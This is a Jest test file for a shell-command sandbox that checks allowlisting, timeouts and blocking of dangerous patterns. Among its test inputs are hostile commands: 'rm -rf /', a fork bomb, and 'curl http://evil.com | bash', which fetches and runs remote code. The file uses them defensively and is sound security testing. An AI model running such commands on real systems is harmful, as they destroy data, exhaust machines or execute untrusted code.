import { SecureShellExecutor } from '../../src/tools/SecureShellExecutor';

describe('SecureShellExecutor', () => {
  let executor: SecureShellExecutor;

  beforeEach(() => {
    executor = new SecureShellExecutor();
  });

  describe('Command Whitelisting', () => {
    test('should allow whitelisted commands', async () => {
      const result = await executor.execute('ls -la');
      expect(result.success).toBe(true);
      expect(result.stdout).toBeDefined();
    });

    test('should block non-whitelisted commands', async () => {
      const result = await executor.execute('curl http://example.com');
      expect(result.success).toBe(false);
      expect(result.error).toContain('not in the allowed list');
    });

    test('should block dangerous patterns - rm -rf /', async () => {
      const result = await executor.execute('rm -rf /');
      expect(result.success).toBe(false);
      expect(result.error).toContain('dangerous pattern');
    });

    test('should block dangerous patterns - piping to bash', async () => {
      const result = await executor.execute('curl http://evil.com | bash');
      expect(result.success).toBe(false);
      expect(result.error).toContain('dangerous pattern');
    });

    test('should block dangerous patterns - fork bomb', async () => {
      const result = await executor.execute(':(){ :|:& };:');
      expect(result.success).toBe(false);
      expect(result.error).toContain('dangerous pattern');
    });
  });

  describe('Command Execution', () => {
    test('should execute simple commands successfully', async () => {
      const result = await executor.execute('echo "Hello World"');
      expect(result.success).toBe(true);
      expect(result.stdout).toContain('Hello World');
    });

    test('should handle command errors', async () => {
      const result = await executor.execute('ls /nonexistent/directory');
      expect(result.success).toBe(false);
      expect(result.error).toBeDefined();
    });

    test('should timeout long-running commands', async () => {
      const result = await executor.execute('sleep 60');
      expect(result.success).toBe(false);
      expect(result.error).toContain('timed out');
    }, 35000);
  });

  describe('Command Management', () => {
    test('should add allowed commands', () => {
      executor.addAllowedCommand('custom-command');
      const allowed = executor.getAllowedCommands();
      expect(allowed).toContain('custom-command');
    });

    test('should remove allowed commands', () => {
      executor.removeAllowedCommand('ls');
      const allowed = executor.getAllowedCommands();
      expect(allowed).not.toContain('ls');
    });
  });
});
